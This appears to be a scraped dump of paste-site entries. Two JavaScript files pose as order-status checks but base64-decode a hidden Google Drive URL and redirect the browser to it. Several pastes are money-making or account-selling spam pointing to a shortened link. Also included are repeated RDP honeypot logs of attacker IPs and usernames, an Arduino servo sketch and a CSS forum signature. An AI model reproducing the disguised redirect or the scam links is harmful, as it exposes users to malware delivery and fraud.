id,title,username,language,date,content
T99NxuZ2,Market.js,Xp_Isolation,JavaScript,Monday 31st of March 2025 07:22:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/317/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wz55CM6g,EARN $900 INSTANTLY 2025 BT,piboon,JavaScript,Monday 31st of March 2025 07:21:41 PM CDT," 
Pdf https://tinyurl.com/methodssss


IMgHX8CJDD
"
yGbQ3wvM,2025-03-30_stats.json,rdp_snitch,JSON,Monday 31st of March 2025 07:18:37 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 82242,
    ""156.146.57.110"": 54795,
    ""156.146.57.174"": 9402,
    ""156.146.57.52"": 9414,
    ""150.95.89.149"": 9372,
    ""148.163.113.105"": 1398,
    ""146.190.105.191"": 1683,
    ""106.14.144.233"": 429,
    ""147.185.132.9"": 9,
    ""188.166.250.11"": 6,
    ""157.245.104.150"": 21,
    ""134.199.222.169"": 6,
    ""87.251.75.21"": 9,
    ""103.97.93.115"": 18,
    ""165.140.242.48"": 3,
    ""178.20.129.235"": 3,
    ""16.16.65.112"": 6,
    ""185.7.214.16"": 12,
    ""160.191.86.233"": 132,
    ""147.182.229.114"": 648,
    ""37.27.18.24"": 3,
    ""194.180.49.123"": 3,
    ""205.210.31.230"": 9,
    ""47.121.132.191"": 9,
    ""147.45.125.11"": 24,
    ""185.142.236.35"": 3,
    ""91.238.181.96"": 6,
    ""1.4.220.16"": 3,
    ""91.238.181.94"": 6,
    ""199.45.154.142"": 3,
    ""58.218.199.219"": 12,
    ""205.210.31.95"": 9,
    ""156.146.57.188"": 2682,
    ""152.32.174.186"": 3,
    ""165.154.104.235"": 3,
    ""185.147.124.177"": 9,
    ""205.210.31.247"": 9
  },
  ""asn"": {
    ""AS60068"": 82242,
    ""AS212238"": 76293,
    ""AS135161"": 9372,
    ""AS53755"": 1398,
    ""AS14061"": 2358,
    ""AS37963"": 438,
    ""AS396982"": 36,
    ""Unknown"": 15,
    ""AS134053"": 18,
    ""AS203380"": 3,
    ""AS24810"": 3,
    ""AS16509"": 6,
    ""AS207566"": 12,
    ""AS153023"": 132,
    ""AS24940"": 3,
    ""AS201814"": 3,
    ""AS400992"": 24,
    ""AS174"": 3,
    ""AS49434"": 12,
    ""AS23969"": 3,
    ""AS398722"": 3,
    ""AS4134"": 12,
    ""AS135377"": 6,
    ""AS49505"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 82242,
    ""Datacamp Limited"": 76293,
    ""GMO-Z.COM PTE. LTD."": 9372,
    ""Input Output Flood LLC"": 1398,
    ""DigitalOcean, LLC"": 2358,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Google LLC"": 36,
    ""DigitalOcean"": 6,
    ""NECHAEVDS-DC2"": 9,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""DA International Group Ltd."": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Amazon.com"": 6,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Shopvps Technology Company Limited"": 132,
    ""Hetzner Online GmbH"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""ZhouyiSat Communications"": 24,
    ""Cogent Communications"": 3,
    ""Datacenter location PAR1 France"": 12,
    ""TOT Public Company Limited"": 3,
    ""Censys, Inc."": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""JSC Selectel"": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 82242,
    ""Datacamp Limited"": 76293,
    ""Zcom Thai"": 9372,
    ""Input Output Flood LLC"": 1398,
    ""DigitalOcean, LLC"": 2358,
    ""Aliyun Computing Co., LTD"": 429,
    ""Palo Alto Networks, Inc"": 36,
    ""Digitalocean"": 6,
    ""Unknown"": 9,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""AlphaVPS LLC"": 3,
    ""Teleset LLC"": 3,
    ""AWS EC2 (eu-north-1)"": 6,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Shopvps Technology Company Limited"": 132,
    ""Hetzner Online GmbH"": 3,
    ""HostSlick"": 3,
    ""Alibaba.com LLC"": 9,
    ""PE Habanov Anthony Uulu Zhazib"": 24,
    ""BlackHOST Ltd."": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""TOT Public Company Limited"": 3,
    ""Censys, Inc."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 6,
    ""Almira LLC"": 9
  },
  ""regionName"": {
    ""North West"": 158535,
    ""Tokyo"": 9372,
    ""Arizona"": 1398,
    ""South West"": 1689,
    ""Shanghai"": 429,
    ""California"": 708,
    ""Karnataka"": 21,
    ""New York"": 12,
    ""Moscow"": 30,
    ""Goa"": 18,
    ""Tatarstan Republic"": 3,
    ""Stockholm"": 6,
    ""\u0110\u1ed3ng Nai Province"": 132,
    ""Uusimaa"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 9,
    ""North Holland"": 3,
    ""\u00cele-de-France"": 12,
    ""Surat Thani"": 3,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Ho Chi Minh"": 3
  },
  ""country"": {
    ""Singapore"": 160224,
    ""Japan"": 9372,
    ""United States"": 2118,
    ""China"": 450,
    ""India"": 39,
    ""Russia"": 33,
    ""Sweden"": 6,
    ""Vietnam"": 135,
    ""Finland"": 3,
    ""Germany"": 3,
    ""The Netherlands"": 3,
    ""France"": 12,
    ""Thailand"": 3,
    ""Hong Kong"": 3
  },
  ""account"": {
    ""hello"": 172290,
    ""aOfGkmCCU"": 3,
    ""eKMbDU"": 3,
    ""FntKpi"": 3,
    ""Administr"": 21,
    ""ncRZWTtSp"": 3,
    ""hIYxet"": 3,
    ""IEErVa"": 3,
    ""cdc2gf3s"": 12,
    ""root"": 3,
    ""Test"": 12,
    ""xvgkf47s"": 12,
    ""(empty)"": 3,
    ""dVfGkwcFN"": 3,
    ""lPhBJn"": 3,
    ""lrtngo"": 3,
    ""Administrator"": 6,
    ""Domain"": 9,
    ""mzHdjJQCG"": 3,
    ""AuSJrG"": 3,
    ""PWKSNU"": 3
  },
  ""keyboard"": {
    ""Unknown"": 172404
  },
  ""client_build"": {
    ""Unknown"": 172404
  },
  ""client_name"": {
    ""Unknown"": 172404
  },
  ""ip_type"": {
    ""hosting & proxy"": 161316,
    ""hosting"": 10860,
    ""Unknown"": 204,
    ""proxy"": 24
  }
}"
D1Sff6He,2025-03-30_stats.json,rdp_snitch,JSON,Monday 31st of March 2025 07:16:21 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 82240,
    ""156.146.57.110"": 54794,
    ""156.146.57.174"": 9402,
    ""156.146.57.52"": 9414,
    ""150.95.89.149"": 9372,
    ""148.163.113.105"": 1398,
    ""146.190.105.191"": 1683,
    ""106.14.144.233"": 429,
    ""147.185.132.9"": 9,
    ""188.166.250.11"": 6,
    ""157.245.104.150"": 21,
    ""134.199.222.169"": 6,
    ""87.251.75.21"": 9,
    ""103.97.93.115"": 18,
    ""165.140.242.48"": 3,
    ""178.20.129.235"": 3,
    ""16.16.65.112"": 6,
    ""185.7.214.16"": 12,
    ""160.191.86.233"": 132,
    ""147.182.229.114"": 648,
    ""37.27.18.24"": 3,
    ""194.180.49.123"": 3,
    ""205.210.31.230"": 9,
    ""47.121.132.191"": 9,
    ""147.45.125.11"": 24,
    ""185.142.236.35"": 3,
    ""91.238.181.96"": 6,
    ""1.4.220.16"": 3,
    ""91.238.181.94"": 6,
    ""199.45.154.142"": 3,
    ""58.218.199.219"": 12,
    ""205.210.31.95"": 9,
    ""156.146.57.188"": 2682,
    ""152.32.174.186"": 3,
    ""165.154.104.235"": 3,
    ""185.147.124.177"": 9,
    ""205.210.31.247"": 9
  },
  ""asn"": {
    ""AS60068"": 82240,
    ""AS212238"": 76292,
    ""AS135161"": 9372,
    ""AS53755"": 1398,
    ""AS14061"": 2358,
    ""AS37963"": 438,
    ""AS396982"": 36,
    ""Unknown"": 15,
    ""AS134053"": 18,
    ""AS203380"": 3,
    ""AS24810"": 3,
    ""AS16509"": 6,
    ""AS207566"": 12,
    ""AS153023"": 132,
    ""AS24940"": 3,
    ""AS201814"": 3,
    ""AS400992"": 24,
    ""AS174"": 3,
    ""AS49434"": 12,
    ""AS23969"": 3,
    ""AS398722"": 3,
    ""AS4134"": 12,
    ""AS135377"": 6,
    ""AS49505"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 82240,
    ""Datacamp Limited"": 76292,
    ""GMO-Z.COM PTE. LTD."": 9372,
    ""Input Output Flood LLC"": 1398,
    ""DigitalOcean, LLC"": 2358,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Google LLC"": 36,
    ""DigitalOcean"": 6,
    ""NECHAEVDS-DC2"": 9,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""DA International Group Ltd."": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Amazon.com"": 6,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Shopvps Technology Company Limited"": 132,
    ""Hetzner Online GmbH"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""ZhouyiSat Communications"": 24,
    ""Cogent Communications"": 3,
    ""Datacenter location PAR1 France"": 12,
    ""TOT Public Company Limited"": 3,
    ""Censys, Inc."": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""JSC Selectel"": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 82240,
    ""Datacamp Limited"": 76292,
    ""Zcom Thai"": 9372,
    ""Input Output Flood LLC"": 1398,
    ""DigitalOcean, LLC"": 2358,
    ""Aliyun Computing Co., LTD"": 429,
    ""Palo Alto Networks, Inc"": 36,
    ""Digitalocean"": 6,
    ""Unknown"": 9,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""AlphaVPS LLC"": 3,
    ""Teleset LLC"": 3,
    ""AWS EC2 (eu-north-1)"": 6,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Shopvps Technology Company Limited"": 132,
    ""Hetzner Online GmbH"": 3,
    ""HostSlick"": 3,
    ""Alibaba.com LLC"": 9,
    ""PE Habanov Anthony Uulu Zhazib"": 24,
    ""BlackHOST Ltd."": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""TOT Public Company Limited"": 3,
    ""Censys, Inc."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 6,
    ""Almira LLC"": 9
  },
  ""regionName"": {
    ""North West"": 158532,
    ""Tokyo"": 9372,
    ""Arizona"": 1398,
    ""South West"": 1689,
    ""Shanghai"": 429,
    ""California"": 708,
    ""Karnataka"": 21,
    ""New York"": 12,
    ""Moscow"": 30,
    ""Goa"": 18,
    ""Tatarstan Republic"": 3,
    ""Stockholm"": 6,
    ""\u0110\u1ed3ng Nai Province"": 132,
    ""Uusimaa"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 9,
    ""North Holland"": 3,
    ""\u00cele-de-France"": 12,
    ""Surat Thani"": 3,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Ho Chi Minh"": 3
  },
  ""country"": {
    ""Singapore"": 160221,
    ""Japan"": 9372,
    ""United States"": 2118,
    ""China"": 450,
    ""India"": 39,
    ""Russia"": 33,
    ""Sweden"": 6,
    ""Vietnam"": 135,
    ""Finland"": 3,
    ""Germany"": 3,
    ""The Netherlands"": 3,
    ""France"": 12,
    ""Thailand"": 3,
    ""Hong Kong"": 3
  },
  ""account"": {
    ""hello"": 172287,
    ""aOfGkmCCU"": 3,
    ""eKMbDU"": 3,
    ""FntKpi"": 3,
    ""Administr"": 21,
    ""ncRZWTtSp"": 3,
    ""hIYxet"": 3,
    ""IEErVa"": 3,
    ""cdc2gf3s"": 12,
    ""root"": 3,
    ""Test"": 12,
    ""xvgkf47s"": 12,
    ""(empty)"": 3,
    ""dVfGkwcFN"": 3,
    ""lPhBJn"": 3,
    ""lrtngo"": 3,
    ""Administrator"": 6,
    ""Domain"": 9,
    ""mzHdjJQCG"": 3,
    ""AuSJrG"": 3,
    ""PWKSNU"": 3
  },
  ""keyboard"": {
    ""Unknown"": 172401
  },
  ""client_build"": {
    ""Unknown"": 172401
  },
  ""client_name"": {
    ""Unknown"": 172401
  },
  ""ip_type"": {
    ""hosting & proxy"": 161313,
    ""hosting"": 10860,
    ""Unknown"": 204,
    ""proxy"": 24
  }
}"
GknTx91v,2025-03-30_stats.json,rdp_snitch,JSON,Monday 31st of March 2025 07:15:17 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 82238,
    ""156.146.57.110"": 54793,
    ""156.146.57.174"": 9402,
    ""156.146.57.52"": 9414,
    ""150.95.89.149"": 9372,
    ""148.163.113.105"": 1398,
    ""146.190.105.191"": 1683,
    ""106.14.144.233"": 429,
    ""147.185.132.9"": 9,
    ""188.166.250.11"": 6,
    ""157.245.104.150"": 21,
    ""134.199.222.169"": 6,
    ""87.251.75.21"": 9,
    ""103.97.93.115"": 18,
    ""165.140.242.48"": 3,
    ""178.20.129.235"": 3,
    ""16.16.65.112"": 6,
    ""185.7.214.16"": 12,
    ""160.191.86.233"": 132,
    ""147.182.229.114"": 648,
    ""37.27.18.24"": 3,
    ""194.180.49.123"": 3,
    ""205.210.31.230"": 9,
    ""47.121.132.191"": 9,
    ""147.45.125.11"": 24,
    ""185.142.236.35"": 3,
    ""91.238.181.96"": 6,
    ""1.4.220.16"": 3,
    ""91.238.181.94"": 6,
    ""199.45.154.142"": 3,
    ""58.218.199.219"": 12,
    ""205.210.31.95"": 9,
    ""156.146.57.188"": 2682,
    ""152.32.174.186"": 3,
    ""165.154.104.235"": 3,
    ""185.147.124.177"": 9,
    ""205.210.31.247"": 9
  },
  ""asn"": {
    ""AS60068"": 82238,
    ""AS212238"": 76291,
    ""AS135161"": 9372,
    ""AS53755"": 1398,
    ""AS14061"": 2358,
    ""AS37963"": 438,
    ""AS396982"": 36,
    ""Unknown"": 15,
    ""AS134053"": 18,
    ""AS203380"": 3,
    ""AS24810"": 3,
    ""AS16509"": 6,
    ""AS207566"": 12,
    ""AS153023"": 132,
    ""AS24940"": 3,
    ""AS201814"": 3,
    ""AS400992"": 24,
    ""AS174"": 3,
    ""AS49434"": 12,
    ""AS23969"": 3,
    ""AS398722"": 3,
    ""AS4134"": 12,
    ""AS135377"": 6,
    ""AS49505"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 82238,
    ""Datacamp Limited"": 76291,
    ""GMO-Z.COM PTE. LTD."": 9372,
    ""Input Output Flood LLC"": 1398,
    ""DigitalOcean, LLC"": 2358,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Google LLC"": 36,
    ""DigitalOcean"": 6,
    ""NECHAEVDS-DC2"": 9,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""DA International Group Ltd."": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Amazon.com"": 6,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Shopvps Technology Company Limited"": 132,
    ""Hetzner Online GmbH"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""ZhouyiSat Communications"": 24,
    ""Cogent Communications"": 3,
    ""Datacenter location PAR1 France"": 12,
    ""TOT Public Company Limited"": 3,
    ""Censys, Inc."": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""JSC Selectel"": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 82238,
    ""Datacamp Limited"": 76291,
    ""Zcom Thai"": 9372,
    ""Input Output Flood LLC"": 1398,
    ""DigitalOcean, LLC"": 2358,
    ""Aliyun Computing Co., LTD"": 429,
    ""Palo Alto Networks, Inc"": 36,
    ""Digitalocean"": 6,
    ""Unknown"": 9,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""AlphaVPS LLC"": 3,
    ""Teleset LLC"": 3,
    ""AWS EC2 (eu-north-1)"": 6,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Shopvps Technology Company Limited"": 132,
    ""Hetzner Online GmbH"": 3,
    ""HostSlick"": 3,
    ""Alibaba.com LLC"": 9,
    ""PE Habanov Anthony Uulu Zhazib"": 24,
    ""BlackHOST Ltd."": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""TOT Public Company Limited"": 3,
    ""Censys, Inc."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 6,
    ""Almira LLC"": 9
  },
  ""regionName"": {
    ""North West"": 158529,
    ""Tokyo"": 9372,
    ""Arizona"": 1398,
    ""South West"": 1689,
    ""Shanghai"": 429,
    ""California"": 708,
    ""Karnataka"": 21,
    ""New York"": 12,
    ""Moscow"": 30,
    ""Goa"": 18,
    ""Tatarstan Republic"": 3,
    ""Stockholm"": 6,
    ""\u0110\u1ed3ng Nai Province"": 132,
    ""Uusimaa"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 9,
    ""North Holland"": 3,
    ""\u00cele-de-France"": 12,
    ""Surat Thani"": 3,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Ho Chi Minh"": 3
  },
  ""country"": {
    ""Singapore"": 160218,
    ""Japan"": 9372,
    ""United States"": 2118,
    ""China"": 450,
    ""India"": 39,
    ""Russia"": 33,
    ""Sweden"": 6,
    ""Vietnam"": 135,
    ""Finland"": 3,
    ""Germany"": 3,
    ""The Netherlands"": 3,
    ""France"": 12,
    ""Thailand"": 3,
    ""Hong Kong"": 3
  },
  ""account"": {
    ""hello"": 172284,
    ""aOfGkmCCU"": 3,
    ""eKMbDU"": 3,
    ""FntKpi"": 3,
    ""Administr"": 21,
    ""ncRZWTtSp"": 3,
    ""hIYxet"": 3,
    ""IEErVa"": 3,
    ""cdc2gf3s"": 12,
    ""root"": 3,
    ""Test"": 12,
    ""xvgkf47s"": 12,
    ""(empty)"": 3,
    ""dVfGkwcFN"": 3,
    ""lPhBJn"": 3,
    ""lrtngo"": 3,
    ""Administrator"": 6,
    ""Domain"": 9,
    ""mzHdjJQCG"": 3,
    ""AuSJrG"": 3,
    ""PWKSNU"": 3
  },
  ""keyboard"": {
    ""Unknown"": 172398
  },
  ""client_build"": {
    ""Unknown"": 172398
  },
  ""client_name"": {
    ""Unknown"": 172398
  },
  ""ip_type"": {
    ""hosting & proxy"": 161310,
    ""hosting"": 10860,
    ""Unknown"": 204,
    ""proxy"": 24
  }
}"
xgdUPv0x,Random Gmail Acc 1A,piboon,JavaScript,Monday 31st of March 2025 07:05:45 PM CDT," 
Pdf https://tinyurl.com/methodssss


bf7DJo0HPh
"
ayCC6Nu3,Products.js,Xp_Isolation,JavaScript,Monday 31st of March 2025 06:51:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/776/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vx4meW2i,Make $1000 15-MINUTES (BEGINNER) WM,piboon,JavaScript,Monday 31st of March 2025 06:49:50 PM CDT," 
Pdf https://tinyurl.com/methodssss


7PQNmemUjk
"
fxDPjJyZ,**Button Control** rev_01,pleasedontcode,Arduino,Monday 31st of March 2025 06:38:56 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Button Control**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-03-31 23:37:08

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* When button one is pressed move ArmsServo1, */
	/* ArmServo2 and ArmServo3 by 45 degrees */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Servo.h>	//https://github.com/arduino-libraries/Servo
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include <FastLED.h> // Added FastLED library for LED control

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t Button1_PushButton_PIN_D2		= 2;
const uint8_t Button2_PushButton_PIN_D4		= 4;

/***** DEFINITION OF PWM OUTPUT PINS *****/
const uint8_t ArmServo1_Servomotor_PWMSignal_PIN_D3		= 3; // This pin is used for Button2
const uint8_t ArmServo2_Servomotor_PWMSignal_PIN_D5		= 5;
const uint8_t ArmServo3_Servomotor_PWMSignal_PIN_D6		= 6;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
uint8_t	ArmServo1_Servomotor_PWMSignal_PIN_D3_rawData		= 0;
uint8_t	ArmServo2_Servomotor_PWMSignal_PIN_D5_rawData		= 0;
uint8_t	ArmServo3_Servomotor_PWMSignal_PIN_D6_rawData		= 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
float	ArmServo1_Servomotor_PWMSignal_PIN_D3_phyData		= 0.0;
float	ArmServo2_Servomotor_PWMSignal_PIN_D5_phyData		= 0.0;
float	ArmServo3_Servomotor_PWMSignal_PIN_D6_phyData		= 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
// LED setup
#define NUM_LEDS 30
#define LED_PIN 6
CRGB leds[NUM_LEDS];

// Servo setup
Servo arm1;
Servo arm2;
Servo arm3;

// Button states
bool button1State = false;
bool button2State = false;

// Servo movement angles
int arm_rest_angle = 0; // Set resting angle for all servos
int arm_move_angle = 45; // Set angle to move servos when button is pressed

void setup(void)
{
	// put your setup code here, to run once:

	pinMode(Button1_PushButton_PIN_D2,	INPUT_PULLUP);
	pinMode(Button2_PushButton_PIN_D4,	INPUT_PULLUP);

	pinMode(ArmServo1_Servomotor_PWMSignal_PIN_D3,	 OUTPUT);
	pinMode(ArmServo2_Servomotor_PWMSignal_PIN_D5,	 OUTPUT);
	pinMode(ArmServo3_Servomotor_PWMSignal_PIN_D6,	 OUTPUT);

	// Set up the servos
	arm1.attach(ArmServo1_Servomotor_PWMSignal_PIN_D3); // Updated to use defined servo pins
	arm2.attach(ArmServo2_Servomotor_PWMSignal_PIN_D5);
	arm3.attach(ArmServo3_Servomotor_PWMSignal_PIN_D6);

	// Set up LED strip
	FastLED.addLeds<WS2812B, LED_PIN, GRB>(leds, NUM_LEDS);
	FastLED.setBrightness(255);

	// Start with LEDs off and solid orange
	fill_solid(leds, NUM_LEDS, CRGB::Orange);
	FastLED.show();
}

void loop(void)
{
	// put your main code here, to run repeatedly:

	// Read button states
	button1State = digitalRead(Button1_PushButton_PIN_D2) == LOW;
	button2State = digitalRead(Button2_PushButton_PIN_D4) == LOW;

	if (button1State && !button2State) {
		MoveArms(); // Call the function to move the servos by 45 degrees
	} else if (button2State && !button1State) {
		HoldLoop();
	} else if (button1State && button2State) {
		FlashAndReset();
	} else {
		ResetServosAndLEDs();
	}

	// Handle LED effects (optional)
	HandleLEDs();
}

// Function to move servos by 45 degrees
void MoveArms() {
	arm1.write(arm_move_angle);
	arm2.write(arm_move_angle);
	arm3.write(arm_move_angle);
	delay(500); // Delay to allow servos to reach the position
	arm1.write(arm_rest_angle);
	arm2.write(arm_rest_angle);
	arm3.write(arm_rest_angle);
}

void updateOutputs()
{
	analogWrite(ArmServo1_Servomotor_PWMSignal_PIN_D3, ArmServo1_Servomotor_PWMSignal_PIN_D3_rawData);
	analogWrite(ArmServo2_Servomotor_PWMSignal_PIN_D5, ArmServo2_Servomotor_PWMSignal_PIN_D5_rawData);
	analogWrite(ArmServo3_Servomotor_PWMSignal_PIN_D6, ArmServo3_Servomotor_PWMSignal_PIN_D6_rawData);
}

// HoldLoop - Move servos to 90 degrees and flicker the LEDs
void HoldLoop() {
	arm1.write(90);
	arm2.write(90);
	arm3.write(90);

	// Flicker effect on LEDs (orange and deep orange)
	static unsigned long lastFlickerTime = 0;
	static bool flickerOn = false;
	if (millis() - lastFlickerTime > 100) {
		lastFlickerTime = millis();
		flickerOn = !flickerOn;
		if (flickerOn) {
			fill_solid(leds, NUM_LEDS, CRGB::Orange);
		} else {
			fill_solid(leds, NUM_LEDS, CRGB::DarkOrange);
		}
		FastLED.show();
	}
}

// FlashAndReset - Flash LEDs to 100% brightness and then reset everything
void FlashAndReset() {
	// Flash LEDs to full brightness for a moment
	fill_solid(leds, NUM_LEDS, CRGB::Yellow);
	FastLED.show();
	delay(200);

	// Reset LEDs and servos to normal
	ResetServosAndLEDs();
}

// Reset the servos and LEDs to their resting positions and state
void ResetServosAndLEDs() {
	arm1.write(arm_rest_angle);
	arm2.write(arm_rest_angle);
	arm3.write(arm_rest_angle);

	// Set LEDs to a dim orange (normal state)
	fill_solid(leds, NUM_LEDS, CRGB::Orange);
	FastLED.show();
}

// Handle LED effects (simple fading and flickering)
void HandleLEDs() {
	static unsigned long lastFadeTime = 0;
	static bool fadeIn = true;
	static int fadeBrightness = 0;

	// Simple fade-in and fade-out effect on LEDs
	if (millis() - lastFadeTime > 100) {
		lastFadeTime = millis();
		if (fadeIn) {
			fadeBrightness += 5;
			if (fadeBrightness >= 255) {
				fadeIn = false;
			}
		} else {
			fadeBrightness -= 5;
			if (fadeBrightness <= 0) {
				fadeIn = true;
			}
		}
		FastLED.setBrightness(fadeBrightness);
		FastLED.show();
	}
}

/* END CODE */"
myhsaVFe,Binance account CW,piboon,JavaScript,Monday 31st of March 2025 06:33:54 PM CDT," 
Pdf https://tinyurl.com/methodssss


Lf34pG8AIX
"
cnjUAkdz,05. Xayah & Rakan | Firma,Athenea-Owl,CSS,Monday 31st of March 2025 06:21:04 PM CDT,"----------XAYAH & RAKAN | FIRMA PARA FORO MODERNBB----------

<center><div class=""atherdcf1""><div class=""atherdcf""><div class=""atherdcfi""></div><div class=""atherdcft""> <b>X</b>ayah & <c>R</c>akan</div><div class=""atherdcs""> The Lovers</div><div class=""atherdcte"">¡La única manera de entender la magia es sumergirse en ella, moverse con ella, bailar y bailar!</div></div></div><a href=""https://athenea-owl.tumblr.com"" style=""font-size: 5px;"" >athenea owl</a></center>
<style>.atherdcf1{--5gradiante: linear-gradient(90deg, rgba(113,162,132,1) 0%, rgba(211,111,160,1) 100%);--5fondo: #fff;--5imagen: url(https://i.servimg.com/u/f30/19/89/84/62/unknow10.png);--5titulo: #000;--5subtitulo: gold;--5texto: #fff;}</style><link rel=""stylesheet"" href=""https://dl.dropboxusercontent.com/scl/fi/785exwh7rb9m0hgu0o0cy/05.-Xayah-y-Rakan-Firma-Modernbb.css?rlkey=ji3jdhq9fay04qhkaekxl2nd1&st=1f5qlpra&"" crossorigin=""anonymous""><link href=""https://fonts.googleapis.com/css2?family=Fjalla+One&family=Satisfy&display=swap"" rel=""stylesheet"">

----------XAYAH & RAKAN | FIRMA PARA FORO PHPBB----------

<center><div class=""atherdcf1""><div class=""atherdcf""><div class=""atherdcfi""></div><div class=""atherdcft""> <b>X</b>ayah & <c>R</c>akan</div><div class=""atherdcs""> The Lovers</div><div class=""atherdcte"" style=""box-sizing: border-box"">¡La única manera de entender la magia es sumergirse en ella, moverse con ella, bailar y bailar!</div></div></div><a href=""https://athenea-owl.tumblr.com"" style=""font-size: 5px;"" >athenea owl</a></center>
